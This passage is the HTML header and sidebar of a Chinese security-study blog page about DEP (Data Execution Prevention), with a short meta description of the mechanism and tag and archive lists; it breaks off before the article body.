<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>数据与程序的分水岭:DEP | 技术栈</title><meta name="description" content="[TOC]  DEP 机制的保护原理 溢出攻击的根源在于计算机未明确区分数据和代码，DEP（数据执行保护，Data Execution Prevention）的基本原理就是将数据所在页面标识为不可执行。   DEP 的主要作用： 阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。 根据实现的机制不同可分为：软件DEP（Software DEP）和硬件DEP（Hardware-enforc"><meta property="og:type" content="article"><meta property="og:title" content="数据与程序的分水岭:DEP"><meta property="og:url" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/index.html"><meta property="og:site_name" content="技术栈"><meta property="og:description" content="[TOC]  DEP 机制的保护原理 溢出攻击的根源在于计算机未明确区分数据和代码，DEP（数据执行保护，Data Execution Prevention）的基本原理就是将数据所在页面标识为不可执行。   DEP 的主要作用： 阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。 根据实现的机制不同可分为：软件DEP（Software DEP）和硬件DEP（Hardware-enforc"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618160130800-16562939498331.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618165748260-16562939498342.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618171923634-16562939498343.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618173743193-16562939498344.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619135451210-16562939498345.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619162125082-16562939498346.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619172626766-16562939498347.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619180931685-16562939498348.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/Blog_rgzz/source/_posts/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620081243474.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620082759710-16562939498349.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620084553195-16556859539081-165629394983410.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620120052278-165629394983411.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620121426020-165629394983412.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620123304414-165629394983413.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620131557944-165629394983414.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620131754734-165629394983415.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620145822498-165629394983516.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620151956530-165629394983517.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220624203825690-165629394983518.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220624204155092-165629394983519.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626101743336-165629394983520.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626110433976-165629394983521.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626105048718-165629394983522.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626111913356-165629394983523.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626114457594-165629394983525.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626112209723-165629394983524.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626115522694-165629394983526.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626140259166-165629394983527.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626134703731-165629394983528.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626155811489-165629394983529.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626161001067-165629394983631.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626165428530-165629394983530.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626170404322-165629394983632.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626172315190-165629394983633.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626170532058-165629394983634.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626180652350-165629394983935.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626180928314-165629394984036.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626181911817-165629394984037.png"><meta property="article:published_time" content="2022-06-27T01:21:00.000Z"><meta property="article:modified_time" content="2022-08-01T10:31:30.860Z"><meta property="article:author" content="rgzzplus"><meta property="article:tag" content="DEP"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618160130800-16562939498331.png"><link rel="canonical" href="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/index.html"><link rel="alternate" href="/atom.xml" title="技术栈" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><meta name="generator" content="Hexo 6.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/rgzz-zq" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">人工智障plus</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Wuhan, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-repository"><a href="/repository"><i class="icon icon-project"></i> <span class="menu-title">项目</span></a></li><li class="menu-item menu-item-links"><a href="/links"><i class="icon icon-friendship"></i> <span class="menu-title">友链</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎来到技术栈！</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA/">个人</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/">经验交流</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/">题库/作业</a><span class="category-list-count">2</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASLR/" rel="tag">ASLR</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" rel="tag">C和指针</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEP/" rel="tag">DEP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GS/" rel="tag">GS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/" rel="tag">Git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HeapSpary/" rel="tag">HeapSpary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LNMP/" rel="tag">LNMP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" rel="tag">Linux保护机制</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" rel="tag">Linux常用命令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/" rel="tag">Linux汇编伪指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEHOP/" rel="tag">SEHOP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SafeSEH/" rel="tag">SafeSEH</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gdb/" rel="tag">gdb</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" rel="tag">linux命令行大全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E9%97%AE%E9%A2%98/" rel="tag">linux问题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ollydebug/" rel="tag">ollydebug</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/task-struct/" rel="tag">task_struct</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/typora/" rel="tag">typora</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" rel="tag">中国知网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" rel="tag">互斥锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" rel="tag">信号量</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" rel="tag">其它类型的漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" rel="tag">内存大小端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" rel="tag">内存攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" rel="tag">函数指针</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" rel="tag">同步互斥</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B1%8F%E9%9A%9C/" rel="tag">屏障</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BB%BA%E7%AB%99/" rel="tag">建站</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E8%B7%AF/" rel="tag">心路</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E8%B0%88/" rel="tag">杂谈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" rel="tag">条件变量</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88/" rel="tag">栈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">正则表达式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" rel="tag">汇编指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" rel="tag">自旋锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" rel="tag">读写锁</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/ASLR/" style="font-size:13px">ASLR</a> <a href="/tags/C/" style="font-size:13px">C++</a> <a href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" style="font-size:13.33px">C和指针</a> <a href="/tags/DEP/" style="font-size:13px">DEP</a> <a href="/tags/GS/" style="font-size:13px">GS</a> <a href="/tags/Git/" style="font-size:13px">Git</a> <a href="/tags/HeapSpary/" style="font-size:13px">HeapSpary</a> <a href="/tags/LNMP/" style="font-size:13px">LNMP</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" style="font-size:13px">Linux保护机制</a> <a href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" style="font-size:13px">Linux常用命令</a> <a href="/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/" style="font-size:13px">Linux汇编伪指令</a> <a href="/tags/SEHOP/" style="font-size:13px">SEHOP</a> <a href="/tags/SafeSEH/" style="font-size:13px">SafeSEH</a> <a href="/tags/c/" style="font-size:13px">c</a> <a href="/tags/gdb/" style="font-size:13.67px">gdb</a> <a href="/tags/hexo/" style="font-size:13.33px">hexo</a> <a href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" style="font-size:13px">linux命令行大全</a> <a href="/tags/linux%E9%97%AE%E9%A2%98/" style="font-size:13px">linux问题</a> <a href="/tags/ollydebug/" style="font-size:13px">ollydebug</a> <a href="/tags/pwn/" style="font-size:13px">pwn</a> <a href="/tags/reverse/" style="font-size:13.33px">reverse</a> <a href="/tags/shellcode/" style="font-size:13.33px">shellcode</a> <a href="/tags/task-struct/" style="font-size:13px">task_struct</a> <a href="/tags/typora/" style="font-size:13px">typora</a> <a href="/tags/ubuntu/" style="font-size:13.67px">ubuntu</a> <a href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" style="font-size:13px">中国知网</a> <a href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" style="font-size:13px">互斥锁</a> <a href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" style="font-size:13px">信号量</a> <a href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" style="font-size:13px">其它类型的漏洞</a> <a href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" style="font-size:13px">内存大小端</a> <a href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" style="font-size:13px">内存攻击</a> <a href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" style="font-size:13px">函数指针</a> <a href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" style="font-size:13px">同步互斥</a> <a href="/tags/%E5%A0%86/" style="font-size:13.67px">堆</a> <a href="/tags/%E5%B1%8F%E9%9A%9C/" style="font-size:13px">屏障</a> <a href="/tags/%E5%BB%BA%E7%AB%99/" style="font-size:13px">建站</a> <a href="/tags/%E5%BF%83%E8%B7%AF/" style="font-size:13px">心路</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size:13.33px">攻防世界</a> <a href="/tags/%E6%9D%82%E8%B0%88/" style="font-size:13px">杂谈</a> <a href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" style="font-size:13px">条件变量</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size:13px">正则表达式</a> <a href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" style="font-size:13px">汇编指令</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size:14px">漏洞</a> <a href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" style="font-size:13px">自旋锁</a> <a href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" style="font-size:13px">读写锁</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">16</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled"><li><div class="item-thumb"><a href="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/" class="title">Linux_shellcode开发之实战</a></p><p class="item-date"><time datetime="2022-08-08T14:39:50.000Z" itemprop="datePublished">2022-08-08</time></p></div></li><li><div class="item-thumb"><a 